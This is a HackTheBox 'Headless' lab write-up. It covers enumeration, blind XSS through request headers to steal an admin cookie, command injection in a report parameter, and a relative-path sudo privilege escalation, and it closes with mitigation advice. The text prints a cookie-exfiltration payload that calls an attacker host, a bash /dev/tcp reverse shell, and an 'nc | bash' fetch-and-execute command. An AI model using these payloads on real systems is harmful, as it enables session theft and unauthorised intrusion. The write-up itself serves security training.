---
title: "HackTheBox - Headless"
author: Nasrallah
description: ""
date: 2024-07-21 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, command injection, xss, sudo, burp suite]
img_path: /assets/img/hackthebox/machines/headless
image:
    path: headless.png
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---

## **Description:**

[Headless](https://www.hackthebox.com/machines/headless) from [HackTheBox](https://affiliate.hackthebox.com/nasrallahbaadi) is an easy box where we exploit an XSS vulnerability to get admin cookie which gives us access to the admin dashboard. There we find a command injection vulnerability in a POST request, we exploit that to get foothold. After that we find we can run a script as root that runs another script with a relative path, so we create a script of our own and get a root shell.

## **Enumeration**

### nmap

We start an Nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.129.230.172
Host is up (0.43s latency).                            
Not shown: 998 closed tcp ports (reset)                                                                               
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:                                                                                                                                                                                                                              
|   256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)           
|_  256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)         
5000/tcp open  upnp?                                                                                                  
| fingerprint-strings:                                                                                                
|   GetRequest:                                                                                                       
|     HTTP/1.1 200 OK                                                                                                 
|     Server: Werkzeug/2.2.2 Python/3.11.2                                                                            
|     Date: Mon, 25 Mar 2024 09:48:31 GMT                                                                             
|     Content-Type: text/html; charset=utf-8                                                                          
|     Content-Length: 2799                                                                                            
|     Set-Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/   
|     Connection: close                                                                                               
|                 
```

We found two open ports, 22 running SSH as usual, and 5000 is a `Werkzeug` python web server.

### Web

Let's check the web page.

![website](1.png)

The website is not complete yet, but we got a `/support` page where we can ask questions.

let's run a directory scan:

```terminal
$ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://10.129.230.172/ -n                                                                                                                                 
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___                                                                                                                                                                                          
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                                                                                                                                           
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                                                                                                                                          
by Ben "epi" Risher 🤓                 ver: 2.10.2                                                                                                                                                                                          
───────────────────────────┬──────────────────────                                                                                                                                                                                          
 🎯  Target Url            │ http://10.129.230.172/                                                                                                                                                                                         
 🚀  Threads               │ 50                                                                                                                                                                                                             
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt                                                                                                                                                    
 👌  Status Codes          │ All Status Codes!                                                                        
 💥  Timeout (secs)        │ 7                                                                                        
 🦡  User-Agent            │ feroxbuster/2.10.2                                                                       
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                       
 🔎  Extract Links         │ true                                                                                                                                                                                                           
 🏁  HTTP methods          │ [GET]                                                                                    
 🚫  Do Not Recurse        │ true                                                                                     
───────────────────────────┴──────────────────────                                                                    
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                   
──────────────────────────────────────────────────                                                                    
Could not connect to http://10.129.230.172/, skipping...                                                              
  => error sending request for url (http://10.129.230.172/): error trying to connect: tcp connect error: Connection refused (os error 111)                                                                                                  
ERROR: Could not connect to any target provided                                                                       
                                                                                                                      
┌──(sirius㉿kali)-[~/CTF/HTB/Machines/headless]                                                                       
└─$ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://10.129.230.172:5000/ -n
                                                                                                                      
 ___  ___  __   __     __      __         __   ___                                                                    
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__                                                                     
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___                                                                    
by Ben "epi" Risher 🤓                 ver: 2.10.2                                                                                                                                                                                          
───────────────────────────┬──────────────────────                                                                    
 🎯  Target Url            │ http://10.129.230.172:5000/                                                              
 🚀  Threads               │ 50                                                                                                                                                                                                             
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt                              
 👌  Status Codes          │ All Status Codes!                                                                        
 💥  Timeout (secs)        │ 7                                                                                        
 🦡  User-Agent            │ feroxbuster/2.10.2                                                                       
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml                                                                                                                                                                             
 🔎  Extract Links         │ true                                                                                     
 🏁  HTTP methods          │ [GET]                                                                                                                                                                                                          
 🚫  Do Not Recurse        │ true                                                                                     
───────────────────────────┴──────────────────────                                                                    
 🏁  Press [ENTER] to use the Scan Management Menu™                                                                   
──────────────────────────────────────────────────                                                                    
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       93l      179w     2363c http://10.129.230.172:5000/support                                         
200      GET       96l      259w     2799c http://10.129.230.172:5000/                                                
500      GET        5l       37w      265c http://10.129.230.172:5000/dashboard
[####################] - 3m     20478/20478   0s      found:3       errors:0      
[####################] - 3m     20477/20477   112/s   http://10.129.230.172:5000/                               
```

We found the `support` page and it's a 200, and we also found `dashboard` but we get 500 code.

Let's check the support page.

![support](2.png)

I filled the form and submitted it but I got nothing.

Next thing I tried is a `XSS` attack using the js alert payload `<script> alert(1) </script>`

![alert](3.png)

I submitted the request and got this:

![hacking detected](4.png)

The website detected the script, out IP is flagged and a report with our browser information is sent to the administrator.

Here we see the headers of our request. Let's test for another `XSS`, this time we put the payload in one of the headers.

We use the same data in picture 3 but we intercept the request with burp.

![headers xss](5.png)

We modify one of the headers, in my case it's `user-agent`.

![xss found](6.png)

We got the alert and confirmed the XSS vulnerability.

### XSS

Here are the information we have:

- The website uses a cookie called `id_admin`
- There is a `dashboard` page that we can't access
- A report is sent to administrator when we submit suspicious message
- The report page is vulnerable to XSS

You see where we are going?

Our next step here is get the administrator's cookie using the XSS vulnerability. The payload we can use is the following:

```js
<script>fetch('http://attacker_ip/'+document.cookie)</script>
```

This payload if opened by the administrator's browser, it sends a HTTP request to us with the administrator's cookie.

We need to setup a listener with `nc -lvnp 80`.

Now we put the payload in one of the headers.

![failedxss](7.png)

I waited for some time but didn't get the cookie, so I pasted the payload in multiple header:

![xssattack](8.png)

I went back to the listener and got the cookie.

![cookie](9.png)

Now we change the cookie and go the `dashboard`.

![dashboard](10.png)

It worked!

## **Foothold**

On the dashboard we see generate report button, when clicked it sends the following request.

![report](11.png)

I tried for command injection in the `date` parameter and got a hit with `;id`.

![command injection](12.png)

Now time for a reverse shell. I put the following bash rev shell in a file:

```bash
bash -i >& /dev/tcp/10.10.16.26/9001 0>&1
```

I served the file with `nc -lvnp 1234 < shell.sh`, this sends the content of the file when it get's a connection.

Now I setup the revshell listener `nc -lvnp 9001`.

On burp suite I put the command `nc 10.10.16.26 1234|bash` which is going to connect to my first listener, get the bash rev shell command from it and pip it to bash in order to get executed.

![burpshell](13.png)

We send the request with burp suite repeater and check the second listener.

![rev shell](14.png)

We got a shell!

## **Privilege Escalation**

After stabilizing the shell, I run sudo and found the following:

```terminal
dvir@headless:~$ sudo -l
Matching Defaults entries for dvir on headless:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User dvir may run the following commands on headless:
    (ALL) NOPASSWD: /usr/bin/syscheck
```

We can run `/usr/bin/syscheck` as root.

Running the file gives the following:

```terminal
dvir@headless:/tmp$ sudo /usr/bin/syscheck                                                                            
Last Kernel Modification Time: 01/02/2024 10:05                                                                       
Available disk space: 1.8G                                                                                            
System load average:  0.06, 0.02, 0.04                                                                                
Database service is not running. Starting it...
```

I searched for it online but didn't find anything so I printed it and got this:

```bash
#!/bin/bash

if [ "$EUID" -ne 0 ]; then
  exit 1
fi

last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
/usr/bin/echo "Last Kernel Modification Time: $formatted_time"

disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
/usr/bin/echo "Available disk space: $disk_space"

load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
/usr/bin/echo "System load average: $load_average"

if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi

exit 0
```

This is a bash script grabs some information about the system.

The interesting part here is the second if statement:

```bash
if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
  /usr/bin/echo "Database service is not running. Starting it..."
  ./initdb.sh 2>/dev/null
else
  /usr/bin/echo "Database service is running."
fi
```

Here the script check for a process with the name `initdb.sh` using `pgrep`, if the process exists it prints `Database service is running.` and if not, it runs `./initdb.sh 2>/dev/null`.

Here we can clearly see the vulnerability which is `./`, it tries to run the shell file `initdb.sh` located in current directory.

We can try creating the same file in our current directory which would result in get it executed when we run the sudo command.

I moved to the `/tmp` directory and created the `initdb.sh` file that prints out the root flag when executed:

```bash
echo 'cat /root/root.txt' > initdb.sh
```

We need to give it execute permission with `chmod +x initdb.sh`

Now we run the sudo command and get the flag.

![flag](15.png)

Alternatively, we can put `/bin/bash` or some reverse shell command to get a shell as root.

## **Prevention and Mitigation**

### XSS (Cross-Site Scripting)

To prevent XSS you need to validate and sanitize all user inputs using a white list, as well as encoding the output before it get rendered in the browser.

### Command injection

To avoid command injections, you should use libraries to carry out actions instead of calling OS commands directly. In our case, the web application is Flask, so python libraries can be used.

### Sudo

The script runs a the `initdb.sh` file located in the current directory `./`. We can avoid this one by using a full path of the file's location, for example(/usr/bin/initdb.sh). But also make sure the file is not writable by anyone and the parent directory belongs to root.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
